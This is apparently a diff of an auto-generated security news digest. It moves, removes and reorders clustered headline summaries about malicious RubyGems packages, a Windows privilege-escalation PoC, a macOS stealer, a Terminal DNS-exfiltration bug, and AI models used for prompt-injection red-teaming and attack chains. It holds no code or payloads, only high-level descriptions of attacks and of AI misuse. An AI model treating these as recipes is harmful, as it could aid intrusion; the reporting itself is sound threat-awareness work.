@@ -3799,78 +3650,6 @@ Attackers went agentic. Your security architecture should too. A CISO's guide to
   - Published: 2026-07-16T00:00:00+00:00
   - Link: https://webflow.sysdig.com/blog/the-cisos-guide-to-headless-cloud-security
   - Summary: Attackers went agentic. Your security architecture should too. A CISO's guide to headless, API-first defense.
-
-### Cluster f84fa8bd3c — score 8
-
-- Title: SleeperGem Uses Three Malicious RubyGems Packages to Target Developer Machines
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-20T05:15:39+00:00
-- Link: https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: supply_chain
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Cybersecurity researchers have flagged a new software supply chain attack codenamed SleeperGem targeting the Ruby ecosystem after three malicious gems were published to RubyGems with the end goal of serving additional payloads. The rogue gems are listed below - git_credential_manager (versions 2.8.0, 2.8.1, 2.8.2, 2.8.3) - Published on July 18, 2026 Dendreo (versions 1.1.3, 1.1.4) -
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: SleeperGem Uses Three Malicious RubyGems Packages to Target Developer Machines
-  - Published: 2026-07-20T05:15:39+00:00
-  - Link: https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html
-  - Summary: Cybersecurity researchers have flagged a new software supply chain attack codenamed SleeperGem targeting the Ruby ecosystem after three malicious gems were published to RubyGems with the end goal of serving additional payloads. The rogue gems are listed below - git_credential_manager (versions 2.8.0, 2.8.1, 2.8.2, 2.8.3) - Published on July 18, 2026 Dendreo (versions 1.1.3, 1.1.4) -
-
-### Cluster 3ab4666a65 — score 8
-
-- Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-15T11:07:07+00:00
-- Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- urgency_signals: poc_available, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- urgency_signals: zero_day, poc_available
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
-  - Published: 2026-07-15T11:07:07+00:00
-  - Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
-  - Summary: Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
 
 ### Cluster 0dd49c6456 — score 8
 
@@ -3977,6 +3756,43 @@ Supermarket giant Lidl has revealed details of a supplier breach impacting custo
   - Link: https://www.infosecurity-magazine.com/news/lidl-notifies-customers-of/
   - Summary: Supermarket giant Lidl has revealed details of a supplier breach impacting customer data
 
+### Cluster 3ab4666a65 — score 8
+
+- Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-15T11:07:07+00:00
+- Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- urgency_signals: poc_available, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- urgency_signals: zero_day, poc_available
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
+  - Published: 2026-07-15T11:07:07+00:00
+  - Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
+  - Summary: Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
+
 ### Cluster c1c459d4b3 — score 8
 
 - Title: AI Mania Is Eviscerating Global Decision-Making
@@ -4012,16 +3828,16 @@ AI Mania Is Eviscerating Global Decision-Making Here's an entertaining perspecti
   - Published: 2026-07-19T05:06:21+00:00
   - Link: https://simonwillison.net/2026/Jul/19/ai-mania/#atom-everything
   - Summary: AI Mania Is Eviscerating Global Decision-Making Here's an entertaining perspective from Nik Suresh on the AI mania that is overwhelming the large companies that he consults with. It's crammed with spicy anecdotes from anonymous sources. In one extreme case, I have seen an executive confess that they had never even used ChatGPT or any AI tool in their life, immediately after producing a technical strategy for an organisation with $2B+ in revenue which was entirely centered around AI. Here's a report from an engineer at a company with a token leaderboard: Checking out a parallel copy of our Go repository and telling the AI to rewrite the whole thing in Zig while I work on something else just so I can keep my job. I particularly enjoyed this conversation with a skeptical executive at an over-enthusiastic company: I asked why this was being repeated without opposition. Was it just sales fluff? The answer was a lot more interesting. It was partially ridiculous sales material being delivered
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: OpenAI’s GPT-Red Automates Prompt Injection Testing to Harden GPT-5.6 Sol
-  - Published: 2026-07-16T08:42:31+00:00
-  - Link: https://thehackernews.com/2026/07/openais-gpt-red-automates-prompt.html
-  - Summary: OpenAI has disclosed details of GPT-Red, an internal automated red-teaming model that scales prompt injection vulnerability discovery with an aim to fix issues before the tools are deployed widely. "GPT‑Red is a strong red-teamer, and our previous models are highly vulnerable to its prompt injection attacks," the artificial intelligence (AI) company said. "We use GPT‑Red to adversarially train
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - Title: Single Prompt Enables ChatGPT to Execute Full Cyber-Attack Chain, Researchers Claim
   - Published: 2026-07-16T13:30:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/chatgpt55-to-execute-full/
   - Summary: Cybersecurity researchers tested Open AI GPT 5.5’s offensive cyber capabilities – and the results showed how effective a frontier LLM can be for hackers
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: OpenAI’s GPT-Red Automates Prompt Injection Testing to Harden GPT-5.6 Sol
+  - Published: 2026-07-16T08:42:31+00:00
+  - Link: https://thehackernews.com/2026/07/openais-gpt-red-automates-prompt.html
+  - Summary: OpenAI has disclosed details of GPT-Red, an internal automated red-teaming model that scales prompt injection vulnerability discovery with an aim to fix issues before the tools are deployed widely. "GPT‑Red is a strong red-teamer, and our previous models are highly vulnerable to its prompt injection attacks," the artificial intelligence (AI) company said. "We use GPT‑Red to adversarially train
 
 ### Cluster 9d039b4e42 — score 8
 
@@ -4059,13 +3875,13 @@ This is a follow-up to my previous Terminal DiLLMa research , and there is a pos
   - Published: 2026-07-16T09:13:18+00:00
   - Link: https://embracethered.com/blog/posts/2026/macos-terminal-dillma-dns-exfil-ansi-escape-code-fix/
   - Summary: This is a follow-up to my previous Terminal DiLLMa research , and there is a positive outcome: Apple fixed a macOS Terminal behavior that enabled a DNS-based data exfiltration technique. DNS Requests via ANSI Escape Codes David Leadbeater originally discovered an interesting behavior in the macOS Terminal app that allowed a special sequence of ANSI escape codes to issue DNS requests. In short, this triggered a DNS request from the macOS Terminal app:
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: New ClickLock macOS Stealer Kills Apps Every 210ms Until Victims Type Their Password
-  - Published: 2026-07-16T12:33:42+00:00
-  - Link: https://thehackernews.com/2026/07/new-clicklock-macos-stealer-kills-apps.html
-  - Summary: ClickLock Stealer, a new macOS infostealer, answers a victim's refusal by killing their apps on a loop until they hand over the login password. It arrives as a command pasted into Terminal, asks for the password behind a fake system dialog, and when the victim cancels, installs two LaunchAgents and quietly exits. At the next login, Finder, the Dock, Spotlight, Terminal, Activity Monitor, and
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - Title: Modular macOS Stealer Uses Kill Loops to Force Password Entry
   - Published: 2026-07-16T13:30:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/clicklock-macos-stealer-clickfix/
   - Summary: New ClickLock macOS stealer locked victims out of their own system until they surrendered a password
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: New ClickLock macOS Stealer Kills Apps Every 210ms Until Victims Type Their Password
+  - Published: 2026-07-16T12:33:42+00:00
+  - Link: https://thehackernews.com/2026/07/new-clicklock-macos-stealer-kills-apps.html
+  - Summary: ClickLock Stealer, a new macOS infostealer, answers a victim's refusal by killing their apps on a loop until they hand over the login password. It arrives as a command pasted into Terminal, asks for the password behind a fake system dialog, and when the victim cancels, installs two LaunchAgents and quietly exits. At the next login, Finder, the Dock, Spotlight, Terminal, Activity Monitor, and
